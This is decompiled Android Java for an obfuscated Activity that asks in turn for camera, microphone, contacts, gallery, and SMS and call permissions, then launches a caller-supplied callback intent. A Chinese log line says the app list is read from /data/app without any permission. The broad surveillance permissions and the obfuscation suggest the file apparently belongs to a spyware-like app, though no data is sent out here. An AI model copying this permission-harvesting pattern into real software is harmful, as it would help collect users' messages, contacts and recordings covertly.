package com.storm.safe.rock.p029ui;

import android.app.Activity;
import android.content.ActivityNotFoundException;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import kotlin.text.AbstractC0779a1;
import p000.AbstractC1117qo;
import p000.AbstractC1120qr;
import p000.RunnableC0941o6;
import p000.t60;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* loaded from: classes2.dex */
public final class umrkmgrri extends Activity {

    /* renamed from: a2 */
    public static final /* synthetic */ int f55196a2 = 0;

    /* renamed from: a0 */
    public String f55197a0;

    /* renamed from: a1 */
    public Intent f55198a1;

    /* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
    /* renamed from: com.storm.safe.rock.ui.umrkmgrri$a0 */
    public static final class C0384a0 {
        public /* synthetic */ C0384a0(AbstractC1120qr abstractC1120qr) {
            this();
        }

        private C0384a0() {
        }
    }

    static {
        new C0384a0(null);
    }

    /* renamed from: a0 */
    public final void m212469a0() {
        Intent intent = this.f55198a1;
        if (intent != null) {
            try {
                ComponentName component = intent.getComponent();
                String className = component != null ? component.getClassName() : null;
                if (className != null && AbstractC0779a1.m213652a5(className, "Service", false)) {
                    startService(intent);
                    return;
                }
                if (className != null && AbstractC0779a1.m213652a5(className, "Activity", false)) {
                    startActivity(intent);
                    return;
                }
                try {
                    startActivity(intent);
                } catch (ActivityNotFoundException unused) {
                    startService(intent);
                }
            } catch (Exception e) {
                t60.m214705c6("umrkmgrri", "执行回调Intent失败", e);
            }
        }
    }

    /* JADX WARN: Failed to restore switch over string. Please report as a decompilation issue */
    @Override // android.app.Activity
    public final void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        this.f55197a0 = getIntent().getStringExtra("permission_type");
        this.f55198a1 = (Intent) getIntent().getParcelableExtra("callback_intent");
        String str = this.f55197a0;
        if (str != null) {
            int i = 0;
            switch (str.hashCode()) {
                case -1367751899:
                    if (str.equals("camera")) {
                        if (AbstractC1117qo.m214411a7(this, "android.permission.CAMERA") == 0) {
                            m212469a0();
                            finish();
                            return;
                        }
                        try {
                            AbstractC1117qo.m214459f8(this, new String[]{"android.permission.CAMERA"}, 200);
                            return;
                        } catch (Exception e) {
                            t60.m214705c6("umrkmgrri", "请求摄像头权限失败", e);
                            finish();
                            return;
                        }
                    }
                    break;
                case -794188193:
                    if (str.equals("appList")) {
                        t60.m214714d6("umrkmgrri", "📱 应用列表权限：使用 /data/app 目录读取，无需特殊权限");
                        m212469a0();
                        finish();
                        return;
                    }
                    break;
                case -567451565:
                    if (str.equals("contacts")) {
                        String[] strArr = {"android.permission.READ_CONTACTS", "android.permission.GET_ACCOUNTS"};
                        while (i < 2) {
                            if (AbstractC1117qo.m214411a7(this, strArr[i]) != 0) {
                                try {
                                    AbstractC1117qo.m214459f8(this, strArr, 204);
                                    return;
                                } catch (Exception e2) {
                                    t60.m214705c6("umrkmgrri", "请求通讯录权限失败", e2);
                                    finish();
                                    return;
                                }
                            }
                            i++;
                        }
                        m212469a0();
                        finish();
                        return;
                    }
                    break;
                case -196315310:
                    if (str.equals("gallery")) {
                        String[] strArr2 = Build.VERSION.SDK_INT >= 33 ? new String[]{"android.permission.READ_MEDIA_IMAGES", "android.permission.READ_MEDIA_VIDEO"} : new String[]{"android.permission.READ_EXTERNAL_STORAGE", "android.permission.WRITE_EXTERNAL_STORAGE"};
                        int length = strArr2.length;
                        while (i < length) {
                            if (AbstractC1117qo.m214411a7(this, strArr2[i]) != 0) {
                                try {
                                    AbstractC1117qo.m214459f8(this, strArr2, 201);
                                    return;
                                } catch (Exception e3) {
                                    t60.m214705c6("umrkmgrri", "请求相册权限失败", e3);
                                    finish();
                                    return;
                                }
                            }
                            i++;
                        }
                        m212469a0();
                        finish();
                        return;
                    }
                    break;
                case 114009:
                    if (str.equals("sms")) {
                        String[] strArr3 = {"android.permission.READ_SMS", "android.permission.SEND_SMS", "android.permission.RECEIVE_SMS", "android.permission.READ_PHONE_STATE", "android.permission.CALL_PHONE"};
                        while (i < 5) {
                            if (AbstractC1117qo.m214411a7(this, strArr3[i]) != 0) {
                                try {
                                    AbstractC1117qo.m214459f8(this, strArr3, 203);
                                    return;
                                } catch (Exception e4) {
                                    t60.m214705c6("umrkmgrri", "请求短信权限失败", e4);
                                    finish();
                                    return;
                                }
                            }
                            i++;
                        }
                        m212469a0();
                        finish();
                        return;
                    }
                    break;
                case 1370921258:
                    if (str.equals("microphone")) {
                        if (AbstractC1117qo.m214411a7(this, "android.permission.RECORD_AUDIO") == 0) {
                            m212469a0();
                            finish();
                            return;
                        }
                        try {
                            AbstractC1117qo.m214459f8(this, new String[]{"android.permission.RECORD_AUDIO"}, 202);
                            return;
                        } catch (Exception e5) {
                            t60.m214705c6("umrkmgrri", "请求麦克风权限失败", e5);
                            finish();
                            return;
                        }
                    }
                    break;
            }
        }
        t60.m214726f4("umrkmgrri", "未知的权限类型: " + this.f55197a0);
        finish();
    }

    @Override // android.app.Activity
    public final void onRequestPermissionsResult(int i, String[] strArr, int[] iArr) {
        t60.m214695b6(strArr, "permissions");
        t60.m214695b6(iArr, "grantResults");
        super.onRequestPermissionsResult(i, strArr, iArr);
        if (iArr.length != 0) {
            int length = iArr.length;
            int i2 = 0;
            while (true) {
                if (i2 >= length) {
                    m212469a0();
                    break;
                } else if (iArr[i2] != 0) {
                    break;
                } else {
                    i2++;
                }
            }
        }
        new Handler(Looper.getMainLooper()).postDelayed(new RunnableC0941o6(26, this), 100L);
    }
}
